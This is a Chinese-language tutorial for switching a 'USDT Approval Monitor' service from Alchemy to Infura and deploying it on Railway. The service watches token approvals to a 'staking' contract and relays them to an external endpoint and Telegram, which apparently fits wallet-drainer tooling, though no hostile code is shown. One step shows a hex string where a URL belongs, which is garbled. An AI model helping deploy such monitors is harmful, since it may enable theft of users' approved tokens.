# 🚀 Infura 替代方案 - 5 分钟快速配置

## ⚠️ 问题

Alchemy 注册被阻止："Blocked signup"

**原因**：
- ❌ 中国大陆 IP 被限制
- ❌ 部分邮箱被限制

---

## ✅ 解决方案：使用 Infura

### 为什么选择 Infura？

| 对比 | Alchemy | Infura |
|------|---------|--------|
| **注册限制** | ❌ 需要VPN | ✅ 无限制 |
| **免费额度** | 100万 CU/月 | 10万请求/天 |
| **WebSocket** | ✅ 支持 | ✅ 支持 |
| **功能** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **稳定性** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

**结论**：**完全可以替代 Alchemy！**

---

## 📝 快速配置步骤

### 步骤 1：注册 Infura（2 分钟）

#### 1.1 访问官网

```
1ee77a16f5f34cc099549ff3b116ccba
```

#### 1.2 注册

点击 **"Get Started for Free"**

**用 Google 账号登录**（最快）

✅ **无需 VPN！直接注册！**

#### 1.3 验证邮箱

打开邮箱 → 点击验证链接

---

### 步骤 2：创建项目（1 分钟）

#### 2.1 创建新项目

Dashboard → **"Create New API Key"**

配置：
```
Network Endpoints: Ethereum
Name: USDT Approval Monitor
```

点击 **"Create"**

#### 2.2 复制 API Key

点击项目 → 查看 **"API Key"**

```
格式：abc123def456ghi789
```

---

### 步骤 3：修改代码（2 分钟）

#### 3.1 更新 package.json

```bash
cd approval-monitor
```

**修改 `package.json`**：

```json
{
  "dependencies": {
    "ethers": "^5.7.2",
    "node-fetch": "^2.7.0",
    "dotenv": "^16.0.3"
  }
}
```

**删除**：
```json
"alchemy-sdk": "^3.0.0"  // ← 删除这行
```

#### 3.2 使用 Infura 版本

```bash
# 重命名文件
mv index.js index-alchemy.js.backup
mv index-infura.js index.js
```

**或直接使用我刚创建的 `index-infura.js`**

#### 3.3 更新 .env

```bash
# .env
INFURA_API_KEY=你的_Infura_API_Key
API_ENDPOINT=https://ethmax.vercel.app
```

---

### 步骤 4：测试（1 分钟）

```bash
# 安装依赖
npm install

# 运行
npm start
```

**预期输出**：

```
🚀 启动 USDT Approval 监听服务 (Infura)...
🔧 初始化 Infura WebSocket Provider...
✅ Infura WebSocket Provider 初始化成功

============================================================
🎯 USDT Approval 事件监听服务 (Infura 版本)
============================================================
📍 监听合约: 0xdAC17F958D2ee523a2206206994597C13D831ec7
🎯 质押合约: 0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218
============================================================

🎧 开始监听 Approval 事件...
✅ Approval 监听服务已启动 (Infura WebSocket)
```

✅ **成功！**

---

## 🚀 部署到 Railway

### 更新环境变量

Railway Dashboard → Variables：

```
删除：ALCHEMY_API_KEY
添加：INFURA_API_KEY = 你的_Infura_API_Key
保留：API_ENDPOINT = https://ethmax.vercel.app
```

### 推送代码

```bash
git add .
git commit -m "切换到 Infura WebSocket"
git push
```

Railway 会自动重新部署！

---

## 📊 功能对比

| 功能 | Alchemy 版本 | Infura 版本 |
|------|-------------|------------|
| **授权检测** | < 15 秒 | < 15 秒 |
| **事件过滤** | ✅ 精准 | ✅ 精准 |
| **自动重连** | ✅ 支持 | ✅ 支持 |
| **处理逻辑** | ✅ 完整 | ✅ 完整 |
| **Telegram 通知** | ✅ 支持 | ✅ 支持 |

**结论**：**功能完全相同！**

---

## ⚠️ 注意事项

### 1. WebSocket 重连

Infura WebSocket 可能偶尔断线，代码已内置自动重连：

```javascript
provider._websocket.on('close', (code) => {
  console.log('🔄 将在 5 秒后重连...')
  setTimeout(() => {
    reconnect()
  }, 5000)
})
```

### 2. 免费额度

**Infura 免费版**：
- 10万 请求/天
- ≈ 3万 WebSocket 消息/天

**预计使用**：
- 每个 Approval ≈ 1 请求
- 每天 10-50 个授权
- ✅ **完全够用！**

---

## ✅ 总结

### Infura vs Alchemy

**Infura 的优势**：
- ✅ 无注册限制（不需要VPN）
- ✅ 免费额度充足
- ✅ 5 分钟完成配置
- ✅ 功能完全相同

**Alchemy 的优势**：
- ⭐ SDK 更丰富
- ⭐ Dashboard 功能更强

**推荐**：
- 🏆 **先用 Infura**（立即可用）
- 🔄 需要时再切换到 Alchemy（需VPN）

---

## 🎉 恭喜！

✅ **已成功绕过 Alchemy 注册限制！**

**系统现在使用 Infura**：
- 完全免费
- 功能相同
- 无需 VPN

**立即部署并测试吧！** 🚀

